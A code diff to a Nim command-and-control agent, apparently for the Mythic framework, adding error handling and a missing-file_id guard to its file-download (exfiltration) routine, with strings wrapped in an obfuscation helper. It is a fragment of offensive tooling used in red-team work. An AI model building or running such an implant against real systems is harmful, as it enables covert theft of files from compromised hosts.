@@ -943,12 +943,32 @@ proc postResponses*(agent: var Agent) =
             case state.taskType
             of btDownload:
               when defined(cmd_download):
+                # Surface Mythic-side errors instead of silently hanging.
+                # Mythic replies with {task_id, status: "error", error: "..."} and no
+                # file_id when e.g. the filemeta INSERT or GetSaveFilePath fails.
+                if taskResp.hasKey(obf("status")) and taskResp[obf("status")].getStr() == obf("error"):
+                  let errMsg = if taskResp.hasKey(obf("error")): taskResp[obf("error")].getStr() else: obf("Mythic refused download (no error detail)")
+                  agent.taskResponses.add(%*{
+                    obf("task_id"): taskId,
+                    obf("completed"): true,
+                    obf("status"): obf("error"),
+                    obf("user_output"): obf("Mythic rejected download: ") & errMsg
+                  })
+                  agent.backgroundTasks.del(taskId)
+                  debug "[DEBUG] Download rejected by Mythic: ", errMsg
+                  continue
+
                 # Got file_id, now send chunks
                 if state.fileId.len == 0 and taskResp.hasKey(obf("file_id")):
                   state.fileId = taskResp[obf("file_id")].getStr()
                   agent.backgroundTasks[taskId] = state
                   debug "[DEBUG] Download got file_id: ", state.fileId
-                
+
+                # Guard: if we still don't have a file_id, we can't send chunks.
+                # Skip rather than attempting to send a chunk with an empty file_id.
+                if state.fileId.len == 0:
+                  continue
+
                 # Send next chunk
                 if state.currentChunk < state.totalChunks:
                   state.currentChunk += 1
